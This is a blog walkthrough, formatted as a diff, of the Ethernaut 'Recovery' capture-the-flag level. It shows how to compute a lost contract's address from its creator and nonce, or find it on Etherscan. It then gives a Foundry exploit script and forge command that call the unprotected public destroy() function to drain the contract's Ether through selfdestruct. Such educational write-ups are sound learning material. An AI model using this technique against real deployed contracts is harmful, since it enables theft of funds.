@@ -1,0 +1,53 @@
+"This level is a token factory contract. The creator has created a new contract using the Recovery Factory contract and deposited some Ether into the newly created contract. They forgot the address of this new contract and our job is to find this lost contract and withdraw the deposited Ether. 
+We will do this level in two different ways, by using Etherscan and by calculating the address of the lost contract. Let's dive in.
+function destroy(address payable _to) public {
+    selfdestruct(_to);
+}
+
+As it is evident from the question, we need to find the lost contract address. Once this is found, we can just call the destroy() function on the contract to withdraw the funds since the visibility is set to public. Let's derive the lost address. 
+destroy()
+public
+According to the Ethereum Yellow Paper - 
+The address of the new account is defined as being the rightmost 160 bits of the Keccak hash of the RLP encoding of the structure containing only the sender and the account nonce.
+This means that the new address will be the rightmost 160 bits of the keccak256 hash of RLP encoding of sender/creator_address and their nonce. 
+0xd6, 0x94
+0x01
+Now that we know the above values, we can calculate the first address created by the factory contract as:
+address lostcontract = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(<creator_address>), bytes1(0x01))))));
+
+This is preferably the easiest method as you won't need to know any calculations and formulas to find the address because the block explorer will show it to you. 
+Go to Etherscan and enter the instance address in the search field and look inside the internal transactions. 
+The transaction flow can be seen creating another contract from the address of the first one. 
+
+This is the address that was lost containing 0.001 Ether stored in it:
+
+Here's how our exploit script in foundry looks:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel17.sol"";
+
+contract POC is Script {
+
+    function run() external{
+        vm.startBroadcast();
+        address payable lostcontract = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0xd89bEAe5D371Bc79754623f7f789a395F3D83b3C), bytes1(0x01))))));
+
+        SimpleToken level15 = SimpleToken(lostcontract);
+        level15.destroy(0xEAce4b71CA1A128e8B562561f46896D55B9B0246);
+
+        vm.stopBroadcast();
+    }
+}
+
+Using the formula described above, we are calculating the address of the lost contract and calling the destroy() with any random address to withdraw the ether from the contract using selfdestruct. 
+destroy()
+selfdestruct
+Execute the script using the following command:
+forge script ./script/level17.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv
+
+
+The updated contract balance can also be checked on Etherscan. The instance can now be submitted to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e.."
